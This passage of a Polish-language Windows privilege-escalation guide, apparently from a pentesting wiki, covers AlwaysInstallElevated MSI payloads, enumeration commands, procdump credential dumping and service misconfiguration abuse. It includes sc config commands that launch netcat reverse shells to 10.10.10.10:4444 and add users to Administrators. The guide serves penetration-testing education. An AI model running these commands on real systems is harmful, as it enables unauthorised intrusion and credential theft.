- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, jako lokalizacji użyj **`C:\privesc`**, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż dojdziesz do kroku 3 z 4 (wybór plików do uwzględnienia). Kliknij **Add** i wybierz właśnie wygenerowany payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a we **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić też inne właściwości, takie jak **Author** i **Manufacturer**, dzięki czemu zainstalowana aplikacja może wyglądać bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony natychmiast po uruchomieniu instalatora.
- W **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirus i detektory

### Ustawienia inspekcji

Te ustawienia określają, co jest **rejestrowane**, więc zwróć na nie uwagę.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** służy do **zarządzania hasłami lokalnych kont Administratora**, zapewniając, że na komputerach dołączonych do domeny każde hasło jest **unikatowe, losowe i regularnie aktualizowane**. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy, którym przyznano odpowiednie uprawnienia za pomocą ACL, co pozwala im wyświetlać lokalne hasła administratora, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli ta funkcja jest aktywna, **hasła w postaci zwykłego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Począwszy od **Windows 8.1**, Microsoft wprowadził ulepszoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci LSA** lub wstrzykiwania do niej kodu przez niezaufane procesy, dodatkowo zabezpieczając system.\
[**Więcej informacji o LSA Protection znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest ochrona poświadczeń przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Poświadczenia buforowane

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Po uwierzytelnieniu danych logowania użytkownika przez zarejestrowany pakiet zabezpieczeń zazwyczaj ustanawiane są poświadczenia domenowe tego użytkownika.\
[**Więcej informacji o poświadczeniach buforowanych**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Sprawdź, czy któraś z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupy uprzywilejowane

Jeśli **należysz do grupy uprzywilejowanej, możesz mieć możliwość eskalacji uprawnień**. Dowiedz się więcej o grupach uprzywilejowanych i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Tokeny Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź następną stronę, aby **poznać interesujące tokeny** i dowiedzieć się, jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / sesje

```bash
qwinsta
klist sessions
```

### Foldery domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Zasady haseł

```bash
net accounts
```

### Pobierz zawartość schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, przeglądając listę procesów, sprawdź, **czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać któryś z uruchomionych plików binarnych** lub czy masz uprawnienia do zapisu w folderze z plikami binarnymi, aby wykorzystać możliwe [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger nasłuchujący może działać krótko, więc brak go w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż każdy zaobserwowany nasłuchujący proces z jego PID-em, właścicielem i możliwością dostępu do niego przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie dowodzi możliwości zdalnego wykonania kodu między użytkownikami. Rutynowe rozpoznanie powinno pozostać pasywne — nie wysyłaj poleceń debuggerowi.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów zawierających pliki binarne procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamic preprocessor Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi, która uruchamia Snort na innym koncie, sprawdź tę konkretną konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token umożliwia tworzenie tam plików, ta ścieżka może wymagać weryfikacji pod kątem wykonania kodu przy następnym ładowaniu modułów przez to zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta, na którym uruchamiany jest proces, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia odmowy dostępu lub udziału; sama możliwość zapisu w katalogu nie dowodzi eskalacji. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa sieci Web z zapisywalnym katalogiem dokumentów

W przypadku instalacji Apache w systemie Windows porównaj ścieżkę pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik o niższych uprawnieniach może tworzyć pliki w tym katalogu, gdy Apache działa jako `LocalSystem`, wykonanie kodu po stronie serwera może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, że udostępniana jest dokładnie ta ścieżka oraz że mechanizm obsługi po stronie serwera przetwarza dany typ pliku; sam zapisywalny katalog główny potwierdza jedynie możliwość tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W typowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja znajduje się obok niego, w `conf\httpd.conf`. Domyślnym katalogiem głównym może być `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź jednocześnie dokładną ścieżkę obrazu usługi, tożsamość, z którą jest uruchamiana, efektywną wartość `DocumentRoot` (z uwzględnieniem rozwinięcia `${INSTALL_DIR}` i nadpisań konfiguracji wirtualnych hostów) oraz ACL katalogu głównego. Możliwość zapisu do katalogu WAMP nie dowodzi, że Apache działa jako `SYSTEM` ani że wykona przesłany plik. [Apache opisuje, jak usługa Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość puli aplikacji w sieci

W IIS przyporządkuj zapisywalny katalog fizyczny aktywnej witrynie/aplikacji w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i obsługiwany po stronie serwera handler. Kod umieszczony w udostępnionym katalogu jest wykonywany jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a trasa jest osiągalna. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan działania witryny, handler i nadpisania ustawień dla danej ścieżki.

Dynamiczna kompilacja ASP.NET to osobna ścieżka do sprawdzenia: pliki generowane w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może to zmienić. [Microsoft opisuje lokalizację i podkatalogi dla poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca izolowanie katalogów kompilacji, gdy pule aplikacji nie ufają sobie nawzajem](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach może zmieniać wygenerowane źródło w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie je skompiluje z użyciem bardziej uprzywilejowanej [tożsamości procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL pliku lub katalogu nie dowodzi możliwości wykonania kodu: powiąż pamięć podręczną z aktywną aplikacją, efektywnym tokenem i ACL, ustawieniami kompilacji, tożsamością procesu oraz momentem ewentualnej ponownej kompilacji. Korzystaj wyłącznie z przeglądu metadanych w trybie tylko do odczytu; podczas inwentaryzacji nie wywołuj kompilacji ani nie zmieniaj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` często uwierzytelnia się w zasobach domeny jako **konto komputera hosta**, nawet jeśli jej lokalny token ma niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa w sieci konta komputera; `LocalService` zwykle przedstawia anonimowe poświadczenia sieciowe. Pula `SpecificUser` korzysta z przypisanego jej konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [tożsamość puli aplikacji w sieci](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się między wersjami IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli używającej w sieci tożsamości konta komputera, sprawdź uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień do replikacji w kontekście nazewniczym domeny; sam bilet konta maszyny ani rola hosta ich nie potwierdzają. Pasywna inwentaryzacja powinna obejmować przegląd konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku dostępnego do odczytu handlera ASP.NET, który uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, deszyfrowanie, walidację i budowanie polecenia. Handler, który dokleja zdekodowany token do `ProcessStartInfo("cmd", "/c ...")`, może umożliwić metaznakiom powłoki zmianę polecenia; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany użytkownik może rzeczywiście wpłynąć na zdekodowaną wartość i dotrzeć do handlera, a następnie określ efektywną tożsamość puli aplikacji lub podszywanego użytkownika oraz tożsamość procesu potomnego. Sama linia kodu dostępna do odczytu, nasłuchiwanie na localhost lub słabość formatu tokenu nie dowodzą możliwości uprzywilejowanego wykonania polecenia. Przeglądaj kod źródłowy i konfigurację puli bez wysyłania sfałszowanych żądań ani uruchamiania procesu pomocniczego podczas pasywnej inwentaryzacji.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` or `require`](https://www.php.net/manual/en/function.include.php), może spowodować wykonanie pliku PHP zapisywalnego przez użytkownika o niższych uprawnieniach z tożsamością procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozwiązana ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może modyfikować, a proces roboczy odczytać, obowiązujące ograniczenia ścieżek PHP zezwalają na dołączenie, a proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Sam listener loopback lub zapisywalny plik nie potwierdza tego łańcucha; podczas pasywnej inwentaryzacji sprawdź kod źródłowy, tożsamość usługi i ACL plików, nie wywołując endpointu.

### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z pakietu sysinternals. Usługi takie jak FTP mają **poświadczenia zapisane w pamięci jawnym tekstem**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niezabezpieczone aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

### Import plików projektu z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu zrzutu, do którego zapis może wykonywać użytkownik o niższych uprawnieniach, przekracza granicę zaufania dla danych wejściowych, działając na koncie importera. Sprawdź **dokładną ścieżkę z prawem zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem Ghidra z otwieraniem/przywracaniem projektu](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie z konta importera, jeśli pozwalały na to [zasady ruchu wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To trop wskazujący na możliwość ujawnienia poświadczeń, a nie na natychmiastowy dostęp administratora: uzyskana odpowiedź musi dać się wykorzystać przez odrębną, autoryzowaną lub podatną ścieżkę, a bieżące wersje należy oceniać na podstawie ich rzeczywistego stanu poprawek. Podczas pasywnego rozpoznania nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest niezależne od praw do istniejącej usługi. Pomyślne, tylko do odczytu, żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) z tym prawem jest przesłanką do dalszej analizy, a nie dowodem, że nowa usługa może zostać uruchomiona. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi żądanymi w chwili jej tworzenia; późniejsze ponowne otwarcie usługi powoduje odrębną kontrolę dostępu i może się nie powieść, nawet jeśli można było użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Podczas pasywnego rozpoznania nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalacji usługi zestaw te prawa SCM z udziałem na hoście docelowym, do którego **to samo logowanie sieciowe** ma prawo zapisu, bazowymi ACL NTFS tego udziału oraz lokalną ścieżką do pliku wykonywalnego, który może uruchomić konto usługi. Konto niebędące administratorem może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM oraz ścieżka umieszczenia pliku; udział administracyjny nie jest warunkiem koniecznym. Samo prawo zapisu do udziału lub sama przesłanka dotycząca prawa utworzenia usługi przez SCM nie dowodzą, że nowa usługa może zostać uruchomiona z wyższą tożsamością.

Istniejąca usługa może wywoływać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli tego pliku nie ma w jej `ImagePath`. Jeśli nazwa pliku pomocniczego jest wyszukiwana w katalogu, do którego zapis może wykonywać użytkownik o niższych uprawnieniach, a usługa działa z wyższymi uprawnieniami, brakujący plik pomocniczy może być warunkowym kandydatem do zastąpienia. Potwierdź **rzeczywisty kod usługi lub udokumentowane wywołanie pliku pomocniczego**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność wyszukiwania, prawa do tworzenia katalogów, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Sam katalog usługi z prawem zapisu lub brakujący plik nie dowodzą, że usługa załaduje ten plik; podczas pasywnej analizy nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to odrębne prawo od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo uruchamiania za coś więcej niż prawo do sterowania, sprawdź kod usługi lub jej udokumentowany interfejs. Jeśli usługa używa argumentu wybranego przez wywołującego jako ścieżki logu lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ od argumentu do zapisu, ograniczenia ścieżki i uprawnienia do **utworzonego pliku**. Zapis do chronionego katalogu może prowadzić do eskalacji tylko wtedy, gdy istnieje odrębny uprzywilejowany proces lub moduł ładujący, który akceptuje ten plik; sam zapisywalny log lub prawo uruchamiania nie wystarczą. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ dostępny do odczytu plik `nsclient.ini` jest **przesłanką do analizy konfiguracji**: może zawierać poświadczenia do interfejsu WWW, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź rzeczywiste konto usługi, nasłuchujący interfejs WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Do uprzywilejowanego wykonania potrzebne są dodatkowo `CheckExternalScripts` (lub inna włączona ścieżka wykonywania), efektywne prawo do rejestrowania lub modyfikowania polecenia oraz wyzwalacz uruchamiający je z tożsamością usługi. Nasłuch ograniczony do loopback nadal może być dostępny dla lokalnego użytkownika, ale sama ścieżka pliku, hasło lub nasłuchujący interfejs nie potwierdzają posiadania tych uprawnień. Podczas pasywnego rozpoznania sprawdź metadane i uprawnienia, nie wyświetlając sekretów ani nie wywołując API WWW. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące zabezpieczania interfejsu WWW i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź rzeczywiste konto, na którym działa usługa, oraz wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację potomną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), a `AppDirectory` to skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za pełny obraz granicy bezpieczeństwa usługi, sprawdź plik wykonywalny aplikacji potomnej i ACL jej katalogu nadrzędnego. Lokalny endpoint WCF lub SOAP udostępniany przez tę aplikację to odrębna przesłanka do analizy: potwierdź, że użytkownik o niższych uprawnieniach może połączyć się z nasłuchem, dokładna operacja przyjmuje jego dane wejściowe, a aplikacja usługi wykonuje niebezpieczną operację z wyższymi uprawnieniami. Konto usługi, adres URL endpointu lub ścieżka z prawem zapisu same w sobie nie dowodzą możliwości eskalacji; podczas pasywnego rozpoznania unikaj wywoływania operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale uprawnienia do wywołania tej **konkretnej** operacji oraz efektywną tożsamość runspace należy sprawdzić osobno. Ścieżka od danych wejściowych wywołującego o niższych uprawnieniach do `AddScript` działającego z tożsamością usługi o wyższych uprawnieniach stanowi granicę wykonywania kodu; sam nasłuchujący port, uwierzytelniony klient lub niewykorzystywana metoda w niepowiązanym zestawie nie są dowodem. Podczas rozpoznania statycznie sprawdź wdrożoną usługę, kontrakt, autoryzację i ustawienia impersonacji, nie wywołując endpointu.

Service Triggers umożliwiają systemowi Windows uruchomienie usługi po wystąpieniu określonych zdarzeń (aktywność nazwanego pipe'a/endpointu RPC, zdarzenia ETW, dostępność IP, podłączenie urządzenia, odświeżenie GPO itd.). Nawet bez praw SERVICE_START często można uruchamiać uprzywilejowane usługi, wywołując ich triggery. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa kolektora diagnostycznego Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystywało junction i wyścig z object-manager-link, aby przekierować reset DACL usługi. Wykazana eskalacja wymagała również dostępnej ścieżki naprawy MSI dla dostawcy WMI Visual Studio Setup oraz pliku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponent naprawiono w styczniu 2024 roku.

Podczas pasywnej weryfikacji sprawdź konto i ścieżkę pliku binarnego tej usługi, czy istnieje ścieżka do kompilatora Setup WMI oraz stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio lub plik kompilatora nie dowodzą, że host jest podatny. Do sprawdzenia nie trzeba uruchamiać usługi ani wykonywać naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się mieć plik binarny **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować jakąkolwiek usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie są z nią powiązane żadne włączone urządzenia._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Należy pamiętać, że usługa upnphost wymaga do działania usługi SSDPSRV (w przypadku XP SP1)**

**Innym sposobem obejścia** tego problemu jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

W scenariuszu, w którym grupa „Authenticated users” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, można zmodyfikować plik wykonywalny usługi. Aby zmodyfikować i uruchomić **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponowne uruchomienie usługi

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę konfiguracji uprawnień, co pozwala zmieniać konfigurację usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i zmianę konfiguracji uprawnień.
- **GENERIC_WRITE**: Zapewnia możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również zapewnia możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystywania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy o niskich uprawnieniach mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć kontrolę nad usługą, **podmieniając plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz zmodyfikować plik binarny uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Każdy plik binarny uruchamiany przez usługę można znaleźć za pomocą **wmic** (nie w system32), a uprawnienia sprawdzić za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz również użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Szukaj niebezpiecznych uprawnień ACL przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza **`(F)`**, **`(M)`** lub **`(W)`** do pliku wykonywalnego usługi albo katalogu, w którym się znajduje. Praktyczny przebieg nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy plik binarny jest zapisywalny, za pomocą `icacls <path>`.
3. Zastąp plik binarny payloadem lub prawidłowym, złośliwym plikiem binarnym usługi.
4. Uruchom usługę ponownie za pomocą `sc stop <service_name> && sc start <service_name>` (lub poczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne zautomatyzowane kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

